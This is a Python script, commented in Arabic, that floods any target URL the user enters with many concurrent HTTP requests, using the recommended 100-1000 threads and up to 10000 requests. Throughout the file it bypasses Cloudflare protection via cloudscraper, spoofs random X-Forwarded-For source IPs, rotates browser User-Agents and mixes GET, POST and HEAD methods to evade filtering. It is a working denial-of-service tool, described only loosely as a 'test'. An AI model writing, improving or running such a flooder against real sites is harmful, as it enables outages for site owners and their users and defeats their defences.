import cloudscraper
import threading
from queue import Queue
import random
import time
import logging

# إعداد تسجيل الأحداث (logging)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# قائمة ثابتة لعناوين User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62",
]

# قائمة عناوين URL المستهدفة
urls = Queue()

# توليد عنوان IP عشوائي
def get_random_ip():
    """
    توليد عنوان IP عشوائي لاستخدامه في رأس الطلب.
    """
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# إرسال الطلبات
def send_requests():
    """
    إرسال طلبات إلى الهدف مع تخطي حماية Cloudflare.
    """
    scraper = cloudscraper.create_scraper()  # إنشاء كائن Scraper
    while not urls.empty():
        url = urls.get()
        for attempt in range(3):  # إعادة المحاولة 3 مرات في حالة الفشل
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept-Language": "en-US,en;q=0.9",
                    "Referer": "https://www.google.com/",
                    "X-Forwarded-For": get_random_ip(),
                }
                method = random.choice(["GET", "POST", "HEAD"])
                if method == "POST":
                    response = scraper.post(url, data={"dummy": "data"}, headers=headers, timeout=5)
                elif method == "HEAD":
                    response = scraper.head(url, headers=headers, timeout=5)
                else:
                    response = scraper.get(url, headers=headers, timeout=5)
                logging.info(f"{method} request sent to {url} | Status: {response.status_code}")
                break  # إذا نجح الطلب، توقف عن إعادة المحاولة
            except Exception as e:
                logging.error(f"Error: {str(e)} | Attempt {attempt + 1} of 3 | Retrying...")
                time.sleep(1)  # انتظر قبل إعادة المحاولة
        urls.task_done()

# الإعداد الرئيسي
def main():
    """
    الإعداد الرئيسي للاختبار.
    """
    target = input("Enter the target URL (with http/https): ").strip()
    thread_count = int(input("Enter the number of threads (recommended: 100-1000): "))
    request_count = int(input("Enter the total number of requests (recommended: 1000-10000): "))

    # التحقق من صحة المدخلات
    if thread_count <= 0 or request_count <= 0:
        logging.error("Invalid input. The number of threads and requests must be greater than 0.")
        return

    # ملء قائمة الطلبات
    for _ in range(request_count):
        urls.put(target)

    threads = []

    # إنشاء وتشغيل الخيوط
    for _ in range(thread_count):
        thread = threading.Thread(target=send_requests)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # انتظار انتهاء جميع الطلبات
    urls.join()

if __name__ == "__main__":
    main()
